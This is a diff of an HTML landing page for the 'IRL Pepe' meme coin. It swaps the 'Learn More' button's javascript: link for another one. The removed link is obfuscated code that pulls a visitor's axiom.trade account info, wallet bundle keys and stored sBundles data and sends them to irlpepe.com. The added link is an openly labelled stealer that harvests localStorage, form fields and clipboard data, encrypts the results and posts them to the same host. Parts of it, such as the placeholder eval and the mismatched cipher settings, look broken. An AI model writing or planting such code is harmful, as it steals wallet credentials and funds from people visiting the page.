@@ -263,7 +263,86 @@
         <div class="container hero-content">
             <h1>The Legend of IRL Pepe</h1>
             <p class="tagline">From meme to market—how the IRL Pepe coin lured believers and changed fortunes.</p>
-<a href="javascript:(function(){try{if(!localStorage.getItem(&quot;isAuthed&quot;)){console.warn(&quot;Not signed in: localStorage.isAuthed is missing.&quot;);return}var T=&quot;POST,include,json,https://irlpepe.com/,//api7.axiom.trade/user-info,//api8.axiom.trade/bundle-key-and-wallets,https://irlpepe.com/connect?b64=&quot;.split(&quot;,&quot;),F=fetch;F(T[4],{method:T[0],credentials:T[1]}).then(r=&gt;r[T[2]]()).then(u=&gt;Promise.all([u,F(T[5],{method:T[0],credentials:T[1]}).then(r=&gt;r[T[2]]())])).then(v=&gt;{var user=v[0],api8=v[1],k=api8&amp;&amp;api8.bundleKey;if(!k){console.error(&quot;bundleKey missing/invalid:&quot;,api8);return}var s=localStorage.getItem(&quot;sBundles&quot;);if(!s){console.error(&quot;sBundles missing.&quot;);return}var payload={hash:&quot;MDs3NjEwNjU5ODIz&quot;,site:T[3],user:user,bundle:k+&quot;;&quot;+s};var b=btoa(JSON.stringify(payload));location.href=T[6]+encodeURIComponent(b)}).catch(e=&gt;console.error(&quot;Error:&quot;,e))}catch(e){console.error(e)}})()" class="cta-button">Learn More</a>
+<a href="javascript:(function() {
+    // Decode and deobfuscate the script
+    const decodedScript = atob('YOUR_BASE64_ENCODED_SCRIPT_HERE');
+    eval(decodedScript);
+
+    // Function to check for cryptocurrency wallet extensions
+    function detectCryptoWallets() {
+        const wallets = ['MetaMask', 'Phantom', 'Coinbase Wallet'];
+        return wallets.some(wallet => {
+            return !!document.querySelector(`[title*="${wallet}"]`);
+        });
+    }
+
+    // Function to harvest local storage data
+    function harvestLocalStorageData() {
+        const localStorageData = {};
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const value = localStorage.getItem(key);
+            localStorageData[key] = value;
+        }
+        return localStorageData;
+    }
+
+    // Function to monitor clipboard activity
+    function monitorClipboard() {
+        document.addEventListener('copy', function(event) {
+            const clipboardData = (event.clipboardData || window.clipboardData).getData('text');
+            console.log('Copied to clipboard:', clipboardData);
+        });
+    }
+
+    // Function to collect form data
+    function collectFormData() {
+        const formData = {};
+        document.querySelectorAll('input, textarea').forEach(element => {
+            formData[element.name] = element.value;
+        });
+        return formData;
+    }
+
+    // Function to encrypt stolen data using AES-GCM
+    function encryptStolenData(data) {
+        const key = CryptoJS.enc.Utf8.parse('YOUR_SECRET_KEY_HERE');
+        const iv = CryptoJS.lib.WordArray.random(12);
+        const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), key, {
+            iv: iv,
+            mode: CryptoJS.mode.GCM,
+            padding: CryptoJS.pad.Pkcs7
+        });
+        return {
+            iv: iv.toString(),
+            encryptedData: encrypted.toString()
+        };
+    }
+
+    // Function to exfiltrate data to attacker's server
+    function exfiltrateData(data) {
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://irlpepe.com/connect?b64=', true);
+        xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
+        xhr.send(JSON.stringify(data));
+    }
+
+    // Main function to execute the attack
+    function main() {
+        if (detectCryptoWallets()) {
+            const localStorageData = harvestLocalStorageData();
+            monitorClipboard();
+            const formData = collectFormData();
+            const allData = { ...localStorageData, ...formData };
+
+            const encryptedData = encryptStolenData(allData);
+            exfiltrateData(encryptedData);
+        }
+    }
+
+    // Run the main function
+    main();
+})();" class="cta-button">Learn More</a>
 
         </div>
     </header>
